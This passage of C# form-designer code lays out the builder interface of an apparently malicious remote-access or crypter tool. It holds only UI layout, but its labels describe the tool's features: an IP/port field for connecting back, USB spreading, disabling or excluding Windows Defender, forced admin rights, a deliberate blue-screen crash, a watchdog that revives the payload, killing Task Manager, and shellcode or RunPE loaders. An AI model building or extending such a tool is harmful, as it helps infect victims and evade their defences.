		guna2GroupBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		guna2GroupBox1.ForeColor = System.Drawing.Color.LightGray;
		guna2GroupBox1.Location = new System.Drawing.Point(63, 44);
		guna2GroupBox1.Name = "guna2GroupBox1";
		guna2GroupBox1.ShadowDecoration.Parent = guna2GroupBox1;
		guna2GroupBox1.Size = new System.Drawing.Size(771, 377);
		guna2GroupBox1.TabIndex = 123;
		guna2GroupBox1.Text = "Set IP/PORT";
		btnStatic.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnStatic.BorderThickness = 1;
		btnStatic.CheckedState.Parent = btnStatic;
		btnStatic.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnStatic.CustomImages.Parent = btnStatic;
		guna2Transition2.SetDecoration(btnStatic, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnStatic, Guna.UI2.AnimatorNS.DecorationType.None);
		btnStatic.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnStatic.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnStatic.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnStatic.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnStatic.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnStatic.DisabledState.Parent = btnStatic;
		btnStatic.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnStatic.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnStatic.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnStatic.ForeColor = System.Drawing.Color.White;
		btnStatic.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnStatic.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnStatic.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnStatic.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnStatic.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnStatic.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnStatic.HoverState.Parent = btnStatic;
		btnStatic.Location = new System.Drawing.Point(423, 251);
		btnStatic.Name = "btnStatic";
		btnStatic.ShadowDecoration.Parent = btnStatic;
		btnStatic.Size = new System.Drawing.Size(101, 21);
		btnStatic.TabIndex = 157;
		btnStatic.Text = "Add Static";
		guna2HtmlToolTip1.SetToolTip(btnStatic, "Add IP/Port to the list!");
		btnStatic.Click += new System.EventHandler(btnStatic_Click);
		btnEx.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnEx.BorderThickness = 1;
		btnEx.CheckedState.Parent = btnEx;
		btnEx.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnEx.CustomImages.Parent = btnEx;
		guna2Transition2.SetDecoration(btnEx, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnEx, Guna.UI2.AnimatorNS.DecorationType.None);
		btnEx.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnEx.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnEx.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnEx.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnEx.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnEx.DisabledState.Parent = btnEx;
		btnEx.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnEx.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnEx.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnEx.ForeColor = System.Drawing.Color.White;
		btnEx.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnEx.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnEx.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnEx.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnEx.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnEx.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnEx.HoverState.Parent = btnEx;
		btnEx.Location = new System.Drawing.Point(257, 251);
		btnEx.Name = "btnEx";
		btnEx.ShadowDecoration.Parent = btnEx;
		btnEx.Size = new System.Drawing.Size(101, 21);
		btnEx.TabIndex = 156;
		btnEx.Text = "Add External Ip";
		guna2HtmlToolTip1.SetToolTip(btnEx, "Add IP/Port to the list!");
		btnEx.Click += new System.EventHandler(btnEx_Click);
		btnLocal.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
		btnLocal.BorderThickness = 1;
		btnLocal.CheckedState.Parent = btnLocal;
		btnLocal.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		btnLocal.CustomImages.Parent = btnLocal;
		guna2Transition2.SetDecoration(btnLocal, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(btnLocal, Guna.UI2.AnimatorNS.DecorationType.None);
		btnLocal.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		btnLocal.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		btnLocal.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		btnLocal.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		btnLocal.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		btnLocal.DisabledState.Parent = btnLocal;
		btnLocal.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnLocal.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
		btnLocal.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		btnLocal.ForeColor = System.Drawing.Color.White;
		btnLocal.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
		btnLocal.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnLocal.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		btnLocal.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		btnLocal.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
		btnLocal.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		btnLocal.HoverState.Parent = btnLocal;
		btnLocal.Location = new System.Drawing.Point(91, 251);
		btnLocal.Name = "btnLocal";
		btnLocal.ShadowDecoration.Parent = btnLocal;
		btnLocal.Size = new System.Drawing.Size(101, 21);
		btnLocal.TabIndex = 155;
		btnLocal.Text = "Add Local ";
		guna2HtmlToolTip1.SetToolTip(btnLocal, "Add IP/Port to the list!");
		btnLocal.Click += new System.EventHandler(btnLocal_Click);
		guna2VSeparator1.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2VSeparator1, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2VSeparator1.FillColor = System.Drawing.Color.FromArgb(64, 64, 64);
		guna2VSeparator1.Location = new System.Drawing.Point(372, 141);
		guna2VSeparator1.Name = "guna2VSeparator1";
		guna2VSeparator1.Size = new System.Drawing.Size(10, 15);
		guna2VSeparator1.TabIndex = 154;
		guna2VSeparator1.UseTransparentBackground = true;
		label21.AutoSize = true;
		label21.BackColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Transition1.SetDecoration(label21, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label21, Guna.UI2.AnimatorNS.DecorationType.None);
		label21.ForeColor = System.Drawing.Color.LightGray;
		label21.Location = new System.Drawing.Point(377, 141);
		label21.Name = "label21";
		label21.Size = new System.Drawing.Size(316, 15);
		label21.TabIndex = 152;
		label21.Text = "PORT                                                                                            ";
		label20.AutoSize = true;
		label20.BackColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Transition1.SetDecoration(label20, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label20, Guna.UI2.AnimatorNS.DecorationType.None);
		label20.ForeColor = System.Drawing.Color.LightGray;
		label20.Location = new System.Drawing.Point(88, 141);
		label20.Name = "label20";
		label20.Size = new System.Drawing.Size(288, 15);
		label20.TabIndex = 151;
		label20.Text = "IP                                                                                          ";
		textPort.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textPort.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(textPort, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(textPort, Guna.UI2.AnimatorNS.DecorationType.None);
		textPort.DefaultText = "";
		textPort.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		textPort.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		textPort.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textPort.DisabledState.Parent = textPort;
		textPort.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textPort.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		textPort.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		textPort.FocusedState.Parent = textPort;
		textPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		textPort.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		textPort.HoverState.Parent = textPort;
		textPort.Location = new System.Drawing.Point(353, 105);
		textPort.Name = "textPort";
		textPort.PasswordChar = '\0';
		textPort.PlaceholderText = "PORT";
		textPort.SelectedText = "";
		textPort.ShadowDecoration.Parent = textPort;
		textPort.Size = new System.Drawing.Size(231, 21);
		textPort.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
		textPort.TabIndex = 150;
		textIP.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textIP.Cursor = System.Windows.Forms.Cursors.IBeam;
		guna2Transition2.SetDecoration(textIP, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(textIP, Guna.UI2.AnimatorNS.DecorationType.None);
		textIP.DefaultText = "";
		textIP.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		textIP.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		textIP.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textIP.DisabledState.Parent = textIP;
		textIP.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		textIP.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		textIP.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		textIP.FocusedState.Parent = textIP;
		textIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		textIP.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
		textIP.HoverState.Parent = textIP;
		textIP.Location = new System.Drawing.Point(87, 105);
		textIP.Name = "textIP";
		textIP.PasswordChar = '\0';
		textIP.PlaceholderText = "IP";
		textIP.SelectedText = "";
		textIP.ShadowDecoration.Parent = textIP;
		textIP.Size = new System.Drawing.Size(260, 21);
		textIP.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
		textIP.TabIndex = 149;
		guna2Separator7.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator7.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(guna2Separator7, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2Separator7, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Separator7.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator7.Location = new System.Drawing.Point(90, 151);
		guna2Separator7.Name = "guna2Separator7";
		guna2Separator7.Size = new System.Drawing.Size(601, 10);
		guna2Separator7.TabIndex = 153;
		guna2Separator7.UseTransparentBackground = true;
		tabPage4.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		tabPage4.Controls.Add(guna2Separator3);
		tabPage4.Controls.Add(guna2GroupBox2);
		guna2Transition2.SetDecoration(tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
		tabPage4.Location = new System.Drawing.Point(4, 44);
		tabPage4.Name = "tabPage4";
		tabPage4.Padding = new System.Windows.Forms.Padding(3);
		tabPage4.Size = new System.Drawing.Size(974, 465);
		tabPage4.TabIndex = 3;
		tabPage4.Text = "Antis";
		guna2Separator3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		guna2Separator3.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(guna2Separator3, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2Separator3, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Separator3.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
		guna2Separator3.Location = new System.Drawing.Point(-162, -3);
		guna2Separator3.Name = "guna2Separator3";
		guna2Separator3.Size = new System.Drawing.Size(1299, 10);
		guna2Separator3.TabIndex = 127;
		guna2Separator3.UseTransparentBackground = true;
		guna2GroupBox2.BorderColor = System.Drawing.Color.FromArgb(26, 26, 26);
		guna2GroupBox2.Controls.Add(chkUSB);
		guna2GroupBox2.Controls.Add(chkKillWD);
		guna2GroupBox2.Controls.Add(chkExclude);
		guna2GroupBox2.Controls.Add(chkAntiK);
		guna2GroupBox2.Controls.Add(chkUac);
		guna2GroupBox2.Controls.Add(chkBsod);
		guna2GroupBox2.Controls.Add(chkAnti);
		guna2GroupBox2.Controls.Add(chkAntiProcess);
		guna2GroupBox2.CustomBorderColor = System.Drawing.Color.FromArgb(27, 27, 27);
		guna2Transition2.SetDecoration(guna2GroupBox2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(guna2GroupBox2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2GroupBox2.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		guna2GroupBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		guna2GroupBox2.ForeColor = System.Drawing.Color.LightGray;
		guna2GroupBox2.Location = new System.Drawing.Point(169, 129);
		guna2GroupBox2.Name = "guna2GroupBox2";
		guna2GroupBox2.ShadowDecoration.Parent = guna2GroupBox2;
		guna2GroupBox2.Size = new System.Drawing.Size(567, 199);
		guna2GroupBox2.TabIndex = 124;
		guna2GroupBox2.Text = "Anti Process";
		chkUSB.AutoSize = true;
		chkUSB.BackColor = System.Drawing.Color.Transparent;
		chkUSB.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkUSB.CheckedState.BorderRadius = 0;
		chkUSB.CheckedState.BorderThickness = 1;
		chkUSB.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkUSB.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkUSB, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkUSB, Guna.UI2.AnimatorNS.DecorationType.None);
		chkUSB.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		chkUSB.Location = new System.Drawing.Point(222, 104);
		chkUSB.Name = "chkUSB";
		chkUSB.Size = new System.Drawing.Size(87, 18);
		chkUSB.TabIndex = 127;
		chkUSB.Text = "USB Spread";
		guna2HtmlToolTip1.SetToolTip(chkUSB, "Spread your payload on all disks!");
		chkUSB.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkUSB.UncheckedState.BorderRadius = 0;
		chkUSB.UncheckedState.BorderThickness = 1;
		chkUSB.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		chkUSB.UseVisualStyleBackColor = false;
		chkKillWD.AutoSize = true;
		chkKillWD.BackColor = System.Drawing.Color.Transparent;
		chkKillWD.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkKillWD.CheckedState.BorderRadius = 0;
		chkKillWD.CheckedState.BorderThickness = 1;
		chkKillWD.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkKillWD.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkKillWD, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkKillWD, Guna.UI2.AnimatorNS.DecorationType.None);
		chkKillWD.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		chkKillWD.Location = new System.Drawing.Point(222, 81);
		chkKillWD.Name = "chkKillWD";
		chkKillWD.Size = new System.Drawing.Size(138, 18);
		chkKillWD.TabIndex = 126;
		chkKillWD.Text = "Kill Windows Defender";
		guna2HtmlToolTip1.SetToolTip(chkKillWD, "Kill Windows defender on execution!");
		chkKillWD.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkKillWD.UncheckedState.BorderRadius = 0;
		chkKillWD.UncheckedState.BorderThickness = 1;
		chkKillWD.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		chkKillWD.UseVisualStyleBackColor = false;
		chkExclude.AutoSize = true;
		chkExclude.BackColor = System.Drawing.Color.Transparent;
		chkExclude.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkExclude.CheckedState.BorderRadius = 0;
		chkExclude.CheckedState.BorderThickness = 1;
		chkExclude.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkExclude.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkExclude, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkExclude, Guna.UI2.AnimatorNS.DecorationType.None);
		chkExclude.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		chkExclude.Location = new System.Drawing.Point(404, 104);
		chkExclude.Name = "chkExclude";
		chkExclude.Size = new System.Drawing.Size(115, 18);
		chkExclude.TabIndex = 125;
		chkExclude.Text = "Exclude From WD";
		guna2HtmlToolTip1.SetToolTip(chkExclude, "Add Pegasus Payload to Windows exclude list!");
		chkExclude.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkExclude.UncheckedState.BorderRadius = 0;
		chkExclude.UncheckedState.BorderThickness = 1;
		chkExclude.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		chkExclude.UseVisualStyleBackColor = false;
		chkAntiK.AutoSize = true;
		chkAntiK.BackColor = System.Drawing.Color.Transparent;
		chkAntiK.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkAntiK.CheckedState.BorderRadius = 0;
		chkAntiK.CheckedState.BorderThickness = 1;
		chkAntiK.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkAntiK.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkAntiK, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkAntiK, Guna.UI2.AnimatorNS.DecorationType.None);
		chkAntiK.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		chkAntiK.Location = new System.Drawing.Point(404, 81);
		chkAntiK.Name = "chkAntiK";
		chkAntiK.Size = new System.Drawing.Size(84, 18);
		chkAntiK.TabIndex = 124;
		chkAntiK.Text = "Watch Dog ";
		guna2HtmlToolTip1.SetToolTip(chkAntiK, "If payload is killed with task manager ,run it again!");
		chkAntiK.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkAntiK.UncheckedState.BorderRadius = 0;
		chkAntiK.UncheckedState.BorderThickness = 1;
		chkAntiK.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		chkAntiK.UseVisualStyleBackColor = false;
		chkUac.AutoSize = true;
		chkUac.BackColor = System.Drawing.Color.Transparent;
		chkUac.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkUac.CheckedState.BorderRadius = 0;
		chkUac.CheckedState.BorderThickness = 1;
		chkUac.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkUac.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkUac, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkUac, Guna.UI2.AnimatorNS.DecorationType.None);
		chkUac.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		chkUac.Location = new System.Drawing.Point(222, 127);
		chkUac.Name = "chkUac";
		chkUac.Size = new System.Drawing.Size(84, 18);
		chkUac.TabIndex = 123;
		chkUac.Text = "Take Admin";
		guna2HtmlToolTip1.SetToolTip(chkUac, "Take admin priviliges on execution!");
		chkUac.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkUac.UncheckedState.BorderRadius = 0;
		chkUac.UncheckedState.BorderThickness = 1;
		chkUac.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		chkUac.UseVisualStyleBackColor = false;
		chkBsod.AutoSize = true;
		chkBsod.BackColor = System.Drawing.Color.Transparent;
		chkBsod.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkBsod.CheckedState.BorderRadius = 0;
		chkBsod.CheckedState.BorderThickness = 1;
		chkBsod.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkBsod.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkBsod, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkBsod, Guna.UI2.AnimatorNS.DecorationType.None);
		chkBsod.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		chkBsod.Location = new System.Drawing.Point(39, 127);
		chkBsod.Name = "chkBsod";
		chkBsod.Size = new System.Drawing.Size(121, 18);
		chkBsod.TabIndex = 122;
		chkBsod.Text = "Blue Screen Error!";
		guna2HtmlToolTip1.SetToolTip(chkBsod, "Blue screen error if payload killed!");
		chkBsod.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkBsod.UncheckedState.BorderRadius = 0;
		chkBsod.UncheckedState.BorderThickness = 1;
		chkBsod.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		chkBsod.UseVisualStyleBackColor = false;
		chkAnti.AutoSize = true;
		chkAnti.BackColor = System.Drawing.Color.Transparent;
		chkAnti.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkAnti.CheckedState.BorderRadius = 0;
		chkAnti.CheckedState.BorderThickness = 1;
		chkAnti.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkAnti.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkAnti, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkAnti, Guna.UI2.AnimatorNS.DecorationType.None);
		chkAnti.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		chkAnti.Location = new System.Drawing.Point(39, 81);
		chkAnti.Name = "chkAnti";
		chkAnti.Size = new System.Drawing.Size(79, 18);
		chkAnti.TabIndex = 120;
		chkAnti.Text = "Anti debug";
		guna2HtmlToolTip1.SetToolTip(chkAnti, "Don't run if debug tools are in the system!");
		chkAnti.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkAnti.UncheckedState.BorderRadius = 0;
		chkAnti.UncheckedState.BorderThickness = 1;
		chkAnti.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		chkAnti.UseVisualStyleBackColor = false;
		chkAntiProcess.AutoSize = true;
		chkAntiProcess.BackColor = System.Drawing.Color.Transparent;
		chkAntiProcess.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkAntiProcess.CheckedState.BorderRadius = 0;
		chkAntiProcess.CheckedState.BorderThickness = 1;
		chkAntiProcess.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkAntiProcess.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkAntiProcess, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkAntiProcess, Guna.UI2.AnimatorNS.DecorationType.None);
		chkAntiProcess.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		chkAntiProcess.Location = new System.Drawing.Point(39, 104);
		chkAntiProcess.Name = "chkAntiProcess";
		chkAntiProcess.Size = new System.Drawing.Size(85, 18);
		chkAntiProcess.TabIndex = 121;
		chkAntiProcess.Text = "kill taskmgr";
		guna2HtmlToolTip1.SetToolTip(chkAntiProcess, "Kill task manager on execution!");
		chkAntiProcess.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkAntiProcess.UncheckedState.BorderRadius = 0;
		chkAntiProcess.UncheckedState.BorderThickness = 1;
		chkAntiProcess.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
		chkAntiProcess.UseVisualStyleBackColor = false;
		tabPage5.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		tabPage5.Controls.Add(chkCert);
		tabPage5.Controls.Add(chkVBS);
		tabPage5.Controls.Add(chkPowershell);
		tabPage5.Controls.Add(chVRunPe);
		tabPage5.Controls.Add(chkObfu);
		tabPage5.Controls.Add(guna2Separator2);
		tabPage5.Controls.Add(richTextBox2);
		tabPage5.Controls.Add(btnShellcode);
		tabPage5.Controls.Add(label6);
		tabPage5.Controls.Add(btnBuild);
		tabPage5.Controls.Add(guna2PictureBox2);
		tabPage5.Controls.Add(guna2PictureBox3);
		tabPage5.Controls.Add(guna2PictureBox4);
		guna2Transition2.SetDecoration(tabPage5, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(tabPage5, Guna.UI2.AnimatorNS.DecorationType.None);
		tabPage5.Location = new System.Drawing.Point(4, 44);
		tabPage5.Name = "tabPage5";
		tabPage5.Size = new System.Drawing.Size(974, 465);
		tabPage5.TabIndex = 4;
		tabPage5.Text = "Code Obfuscation";
		chkCert.AutoSize = true;
		chkCert.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkCert.CheckedState.BorderRadius = 0;
		chkCert.CheckedState.BorderThickness = 1;
		chkCert.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkCert.CheckMarkColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2Transition2.SetDecoration(chkCert, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkCert, Guna.UI2.AnimatorNS.DecorationType.None);
		chkCert.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f);
		chkCert.Location = new System.Drawing.Point(330, 416);
		chkCert.Name = "chkCert";
		chkCert.Size = new System.Drawing.Size(84, 17);
		chkCert.TabIndex = 131;
		chkCert.Text = "Cert Installer";
		guna2HtmlToolTip1.SetToolTip(chkCert, "Obfuscate Payload!");
		chkCert.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkCert.UncheckedState.BorderRadius = 0;
		chkCert.UncheckedState.BorderThickness = 1;
		chkCert.UncheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkCert.Visible = false;
		chkVBS.AutoSize = true;
		chkVBS.CheckedState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
		chkVBS.CheckedState.BorderRadius = 0;
		chkVBS.CheckedState.BorderThickness = 1;
		chkVBS.CheckedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
		chkVBS.CheckMarkColor = System.Drawing.Color.FromArgb(125, 125, 125);
		guna2Transition2.SetDecoration(chkVBS, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(chkVBS, Guna.UI2.AnimatorNS.DecorationType.None);
		chkVBS.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f);
		chkVBS.Location = new System.Drawing.Point(329, 436);
		chkVBS.Name = "chkVBS";
		chkVBS.Size = new System.Drawing.Size(83, 17);
		chkVBS.TabIndex = 130;
		chkVBS.Text = "VBS Loader";
